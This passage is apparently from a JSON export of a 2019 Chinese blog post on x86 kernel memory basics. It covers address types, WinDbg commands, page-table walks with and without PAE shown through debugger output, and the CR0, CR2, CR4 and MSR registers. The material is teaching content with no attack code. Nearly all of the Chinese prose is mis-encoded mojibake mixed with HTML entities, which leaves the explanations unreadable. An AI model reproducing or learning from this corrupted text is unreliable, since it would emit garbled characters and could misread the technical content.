è·³å‡ºåˆ°ç”¨æˆ·å±‚ã€‚\n\n\nåœ°å€çš„ç§ç±»\n\né€»è¾‘åœ°å€ï¼šæŒ‡ æ®µå¯„å­˜å™¨+æ®µå†…åç§» è¡¨ç¤ºçš„ä¸€ä¸ªåœ°å€ã€‚\nçº¿æ€§åœ°å€ï¼šæŒ‡ è¿›ç¨‹ç‹¬æœ‰è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­ çš„åœ°å€ã€‚ åˆ†æ®µæœºåˆ¶å°†é€»è¾‘åœ°å€è½¬æ¢ä¸ºçº¿æ€§åœ°å€ã€‚\nç‰©ç†åœ°å€ï¼šæŒ‡ å®é™…è®¿é—®åˆ°çš„å†…å­˜æ¡ çš„åœ°å€ã€‚åˆ†é¡µæœºåˆ¶å°†çº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚\n\nWinDbg ç›¸å…³æŒ‡ä»¤\n!process 0 0: åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­çš„æ‰€æœ‰è¿›ç¨‹çš„ä¿¡æ¯\n!process 0 0 notepad.exeï¼š åˆ—å‡ºæŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯\n.process è¿›ç¨‹çš„ EPROCESS: åˆ‡æ¢åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ï¼Œä½¿ç”¨å®ƒçš„ CR3\ns -u 0x00000000 L0x1000000 â€œmmmmmwwwwwâ€: ä»æŒ‡å®šä½ç½®å¼€å§‹æœç´¢æŒ‡å®šçš„å­—ç¬¦ä¸²\n\nè™šæ‹Ÿåœ°å€è½¬æ¢ï¼ˆæ— PAEï¼‰\nx86ç¯å¢ƒä¸‹ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹¥æœ‰è‡ªå·±çš„ 4GB è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¸»è¦ç”± CR3 è¿›è¡ŒåŒºåˆ†\n\nCR3å¯„å­˜å™¨ä¿å­˜äº†æ¯ä¸€ä¸ªè¿›ç¨‹ç‹¬æœ‰çš„é¡µç›®å½•è¡¨(PDT)ï¼Œé¡µç›®å½•è¡¨æ˜¯ä¸€ä¸ªå…ƒç´ ä¸ªæ•°ä¸º 1024 çš„è¡¨ï¼Œå…¶ä¸­çš„æ¯ä¸€é¡¹å æœ‰ 4 ä¸ªå­—èŠ‚ï¼Œå«åš é¡µç›®å½•é¡¹ï¼ˆPDTEï¼‰ï¼Œé¡µç›®å½•è¡¨é¡¹é…åˆè™šæ‹Ÿåœ°å€çš„é«˜ 10 ä½ç»„æˆçš„ç´¢å¼•å¯ä»¥å¯»å€ã€‚\nå¯»å€åˆ°çš„é¡µç›®å½•è¡¨é¡¹ï¼Œå®ƒçš„ä½12ä½ä¿å­˜çš„æ˜¯å±æ€§ä½ï¼Œé™¤å¼€å±æ€§ä½å°±æ˜¯é¡µè¡¨(PT)ï¼Œé¡µè¡¨æ˜¯ä¸€ä¸ªå…ƒç´ ä¸ªæ•°ä¸º1024 çš„è¡¨ï¼Œå…¶ä¸­çš„æ¯ä¸€é¡¹å  4 å­—èŠ‚ï¼Œæè¿°äº†ä¸€ä¸ªé¡µçš„ä¿¡æ¯\n\n\næ‰¾åˆ°äº†é¡µè¡¨åï¼Œé…åˆä¸­é—´çš„10ä½ï¼Œå¯»å€åˆ°æœ€ç»ˆçš„é¡µ(PAGE)\n\nå¯»å€è¿‡ç¨‹\n\n\n0042d f48: 001 + 02d + f48\n\nkd&gt; !dd 5bdf1000  \t\t\t\t\té¡µç›®å½•è¡¨\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 5bdf1000+(1*4)              é¡µç›®å½•è¡¨é¡¹ -&gt; é¡µè¡¨\n#5bdf1004 02b3e867 00000000 00000000 03393867\n#5bdf1014 3929e867 02ad9867 36deb867 023ec867\n\nkd&gt; !dd 02b3e000+(4*2d)             é¡µè¡¨ -&gt; é¡µ\n# 2b3e0b4 019ac867 01406867 44608867 01209867\n# 2b3e0c4 0210a867 0251e867 02825867 00924867\n# 2b3e0d4 36e29867 37d28867 36d2f867 38930867\n\nkd&gt; !du 019ac000+f48                é¡µ -&gt; ç‰©ç†åœ°å€\n# 19acf48 &quot;1233211234567..F&quot;\n\n\n00130bd4ï¼š 000(é¡µç›®å½•è¡¨ç´¢å¼•) + 130(é¡µè¡¨ç´¢å¼•) + bd4(é¡µå†…åç§»)\n\nkd&gt; !dd 5bdf1000  \t\t\t\t\té¡µç›®å½•è¡¨\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 5bdf1000+(0*4)\n#5bdf1000 45031867 02b3e867 00000000 00000000\n#5bdf1010 03393867 3929e867 02ad9867 36deb867\n#5bdf1020 023ec867 09401867 32d03867 38a74867\n\nkd&gt; !dd 45031000 + (4*130)\n#450314c0 376c5867 00000080 00000080 00000080\n#450314d0 028c7867 372c6867 00000080 00000080\n#450314e0 029c9867 01acd867 445c8867 028ce867\n\nkd&gt; !du 376c5000 + bd4\n#376c5bd4 &quot;1233211234567&quot;\n\nå¼€å¯PAEçš„æƒ…å†µ\n2ï¼šé¡µç›®å½•è¡¨æŒ‡é’ˆè¡¨(4) + 9:é¡µç›®å½•è¡¨(512) + 9: é¡µè¡¨(512) + 12:åç§»(0x1000)\nä¸ç®¡æœ‰æ²¡æœ‰å¼€å¯ PAEï¼Œèƒ½å¤Ÿæè¿°çš„é¡µéƒ½æ˜¯ä¸€æ ·å¤šçš„ï¼Œä½†æ˜¯å’Œæ²¡æœ‰PAEçš„æƒ…å†µç›¸æ¯”ï¼Œå¼€äº†çš„æ¯ä¸€ä¸ªé¡¹å äº†8å­—èŠ‚ç©ºé—´ï¼Œæ‰€ä»¥å¯ä»¥å……åˆ†åˆ©ç”¨å¤§äº 4 GBçš„ç‰©ç†å†…å­˜ã€‚\n\nkd&gt; !process 0 0 notepad.exe\nPROCESS 87bfbc00  SessionId: 1  Cid: 029c    Peb: 7ffd3000  ParentCid: 05ac\n    DirBase: 7f5fe560  ObjectTable: 90a553c8  HandleCount:  61.\n    Image: notepad.exe\n\n\n\nkd&gt; .process 87bfbc00\nImplicit process is now 87bfbc00\nWARNING: .cache forcedecodeuser is not enabled\n\n\n\nkd&gt; s -u 0x00000000 L0x01000000 &quot;1234567654321&quot;\n\n0040e100  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.\n01890bd4  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.\n\n\n0040e100 è½¬æ¢ä¸ºäºŒè¿›åˆ¶ \t\t00 000000010      000001110 \t\t  000100000000\n\t\t\t\t\t\t\t0\t\t  2\t\t\t\t e\t\t\t  100\nkd&gt; du 0040e100\n0040e100  &quot;1234567654321321&quot;\n\n\nkd&gt; !dq 7f5fe560\n#7f5fe560 00000000&#96;57f0c801 00000000&#96;5828d801\n#7f5fe570 00000000&#96;5838e801 00000000&#96;5860f801\n#7f5fe580 00000000&#96;78201801 00000000&#96;79182801\n#7f5fe590 00000000&#96;79103801 00000000&#96;79504801\n#7f5fe5a0 00000000&#96;7815c801 00000000&#96;77f5d801\n\n\n\nkd&gt; !dq 57f0c000+(2*8)\n#57f0c010 00000000&#96;58707867 00000000&#96;5825f867\n#57f0c020 00000000&#96;00000000 00000000&#96;00000000\n#57f0c030 00000000&#96;00000000 00000000&#96;00000000\n#57f0c040 00000000&#96;00000000 00000000&#96;582af867\n#57f0c050 00000000&#96;572ed867 00000000&#96;566bb867\n#57f0c060 00000000&#96;57851867 00000000&#96;00000000\n\n\n\n\nkd&gt; !dq 58707000 +(e*8)\n#58707070 80000000&#96;5762b867 80000000&#96;58069867\n#58707080 80000000&#96;56aea867 80000000&#96;570eb867\n#58707090 80000000&#96;57d6c867 80000000&#96;5796e867\n#587070a0 80000000&#96;5686f867 80000000&#96;57771867\n#587070b0 80000000&#96;56cf0867 80000000&#96;57b73867\n#587070c0 80000000&#96;571f2867 80000000&#96;57874867\n\n\n\nkd&gt; !du 5762b100\n#5762b100 &quot;1234567654321321&quot;\n\n&#x2F;&#x2F;ç¬¬äºŒä¸ªåœ°å€\n01890bd4  00 000001100 010010000 101111010100\n\t\t  0\t\t\tc    0x90\t\t\tbd4\n\nkd&gt; du 01890bd4\n01890bd4  &quot;1234567654321&quot;\n\n\n\nkd&gt; !dq 7f5fe560\n#7f5fe560 00000000&#96;57f0c801 00000000&#96;5828d801\n#7f5fe570 00000000&#96;5838e801 00000000&#96;5860f801\n#7f5fe580 00000000&#96;78201801 00000000&#96;79182801\n#7f5fe590 00000000&#96;79103801 00000000&#96;79504801\n#7f5fe5a0 00000000&#96;7815c801 00000000&#96;77f5d801\n\n\nkd&gt; !dq 57f0c000 + (0xc * 8)\n#57f0c060 00000000&#96;57851867 00000000&#96;00000000\n#57f0c070 00000000&#96;5810d867 00000000&#96;5848f867\n#57f0c080 00000000&#96;5860e867 00000000&#96;00000000\n#57f0c090 00000000&#96;580a6867 00000000&#96;57628867\n#57f0c0a0 00000000&#96;58329867 00000000&#96;00000000\n\n\nkd&gt; !dq 57851000 + (0x90 * 8)\n#57851480 80000000&#96;587e6867 00000000&#96;00000080\n#57851490 00000000&#96;00000080 00000000&#96;00000080\n#578514a0 80000000&#96;584e8867 80000000&#96;57ae7867\n#578514b0 00000000&#96;00000080 00000000&#96;00000080\n\n\nkd&gt; !du 587e6000 + 0xbd4\n#587e6bd4 &quot;1234567654321&quot;\n\nè¡¥å……å†…å®¹æ§åˆ¶å¯„å­˜å™¨CPUä¸­æœ‰ä¸€ç³»åˆ—æ§åˆ¶å¯„å­˜å™¨ç”¨äºæ§åˆ¶å’Œç¡®å®šCPUçš„ä¿æŠ¤æ¨¡å¼ï¼ŒCR0-CR4\nCR1 ä¿ç•™\nCR3é¡µç›®å½•åŸºå€\nCR0å¯„å­˜å™¨\n\n\n31\n30\n29\n28-19\n18\n17\n16\n15-6\n5\n4\n3\n2\n1\n0\n\n\n\nPG\nCD\nNW\n\nAM\n\nWP\n\nNE\nET\nTS\nEM\nMP\nPE\n\n\nPEï¼šCR0çš„0ä½æ˜¯å¯ç”¨ä¿æŠ¤ï¼ˆProtection Enableï¼‰æ ‡å¿—\n PE &#x3D; 1ä¿æŠ¤æ¨¡å¼ PE &#x3D; 0 å®åœ°å€æ¨¡å¼è¿™ä¸ªæ ‡å¿—ä»…å¼€å¯æ®µçº§ä¿æŠ¤ï¼Œè€Œå¹¶æ²¡æœ‰å¯ç”¨åˆ†é¡µæœºåˆ¶ã€‚è‹¥è¦å¯ç”¨åˆ†é¡µæœºåˆ¶ï¼Œé‚£ä¹ˆPEå’ŒPGéƒ½è¦ç½®ä½\nPGï¼šå½“è®¾ç½®è¯¥ä½æ—¶å³å¼€å¯äº†åˆ†é¡µæœºåˆ¶ã€‚åœ¨å¼€å¯è¿™ä¸ªæ ‡å¿—ä¹‹å‰å¿…é¡»å·²ç»æˆ–åŒæ—¶å¼€å¯äº†PEæ ‡å¿—\n PG &#x3D; 0 ä¸”PE &#x3D; 0 å¤„ç†å™¨å·¥ä½œåœ¨å®åœ°å€æ¨¡å¼ä¸‹\n PG &#x3D; 0 ä¸”PE &#x3D; 1å¤„ç†å™¨å·¥ä½œåœ¨æ²¡æœ‰å¼€å¯åˆ†é¡µæœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼ˆæ²¡æœ‰è¿™ç§æ“ä½œç³»ç»Ÿï¼‰\n PG &#x3D; 1 ä¸”PE &#x3D; 0åœ¨PEæ²¡æœ‰å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ— æ³•å¼€å¯PG\n PG &#x3D; 1 ä¸”PE &#x3D; 1å¤„ç†å™¨å·¥ä½œåœ¨å¼€å¯äº†åˆ†é¡µæœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿï¼‰\nCR2å¯„å­˜å™¨å½“CPUè®¿é—®è«æ ¼æ— æ•ˆé¡µé¢æ—¶ï¼Œä¼šäº§ç”Ÿç¼ºé¡µç°è±¡ï¼Œæ­¤æ—¶ï¼ŒCPUä¼šå°†å¼•èµ·å¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜æ”¾åœ¨CR2ä¸­\nCR4å¯„å­˜å™¨\n\n\n31-11\n10\n9\n8\n7\n6\n5\n4\n3\n2\n1\n0\n\n\n\nä¿ç•™ä½ï¼ˆç½®0ï¼‰\n\n\nPCE\nPGE\nMCE\nPAE\nPSE\nDE\nTSD\nPVI\nVME\n\n\nPAE&#x2F;PSE:\nPAE &#x3D; 1 æ˜¯PAEåˆ†é¡µ PAE &#x3D; 0 æ˜¯æ™®é€šåˆ†é¡µ\nMSRå¯„å­˜å™¨CPUä¸­æœ‰ä¸€ç»„å¯„å­˜å™¨ï¼Œç§°ä¹‹ä¸ºç‰¹æ®Šæ¨¡å—å¯„å­˜å™¨ï¼Œè¿™ç±»å¯„å­˜å™¨æ•°é‡åºå¤§ï¼ŒåŠŸèƒ½å„å¼‚ï¼š\n æ€§èƒ½ç›‘è§†è®¡æ•°\n è°ƒè¯•æ‰©å±•æ”¯æŒ\n æœºå™¨æ£€æŸ¥\n åŠŸè€—ä¸æ¸©æ§ç®¡ç†\n ç‰¹æ®ŠæŒ‡ä»¤çš„æ”¯æŒ\n å¤„ç†å™¨ç‰¹æ€§å’Œå¤„ç†å™¨è«æ–¯æ”¯æŒ\næ¯ä¸€ä¸ªMSRå¯„å­˜å™¨éƒ½æœ‰å®ƒçš„ç¼–å·å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŒ‡ä»¤åˆ†åˆ«å¯¹å…¶è¯»å†™ï¼Œä¸€ä¸‹æŒ‡ä»¤åªèƒ½åœ¨0ç¯ç‰¹æƒçº§æ‰èƒ½æ‰§è¡Œ\n rdmsrï¼š ecx å­˜æ”¾åºå·ï¼Œæ‰§è¡Œå®Œåæ•°æ®å­˜æ”¾åœ¨eaxä¸­\n wrmsrï¼š eax å­˜æ”¾æ•°æ®ï¼Œecxå­˜æ”¾åºå·ï¼Œæ‰§è¡Œåå°†eaxå†™å…¥åˆ°ç›¸åº”çš„å¯„å­˜å™¨\næ€»ç»“å‘æ˜ä¿æŠ¤æ¨¡å¼æ˜¯ä¸ºäº†è¿›è¡Œå¤šä»»åŠ¡è®¾è®¡ï¼Œé¿å…ä»»åŠ¡ä¹‹é—´ç›¸äº’å¹²æ‰°ï¼Œä¿æŠ¤æ¨¡å¼å®ç°çš„æ˜¯é€šè¿‡åˆ†æ®µå’Œåˆ†é¡µæœºåˆ¶æ¥è¿›è¡Œçš„ã€‚é€šè¿‡è®¾ç½®CR0çš„PEæ ‡å¿—ä½å¯ä»¥è®©å¤„ç†å™¨å·¥ä½œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼ŒPGä½å¯ä»¥å¼€å¯åˆ†é¡µä¿æŠ¤æœºåˆ¶ã€‚\né€šè¿‡åˆ†æ®µä¿æŠ¤æœºåˆ¶ï¼Œå¤„ç†å™¨ä½¿ç”¨æ®µå¯„å­˜å™¨ä¸­é€‰æ‹©ç¬¦ï¼ˆRPLå’ŒCPLï¼‰å’Œæ®µæè¿°ç¬¦å„ä¸ªå­—æ®µæ¥æ‰§è¡Œä¿æŠ¤éªŒè¯ã€‚\nå¯¹äºåˆ†é¡µæœºåˆ¶ï¼Œä¸»è¦ç”¨é¡µç›®å½•å’Œé¡µè¡¨é¡¹ä¸­çš„R&#x2F;Wå’ŒU&#x2F;Sæ ‡å¿—æ¥å®ç°ä¿æŠ¤æ“ä½œï¼ŒVirtualProtectå‡½æ•°å°±æ˜¯é€šè¿‡ä¿®æ”¹R&#x2F;Wæ¥ä¿®æ”¹åˆ†é¡µçš„è¯»å†™å±æ€§\n","slug":"å†…æ ¸åŸºç¡€","date":"2019-05-24T08:06:18.000Z","categories_index":"å†…æ ¸","tags_index":"å†…æ ¸åŸºç¡€","author_index":"Akpigs"}]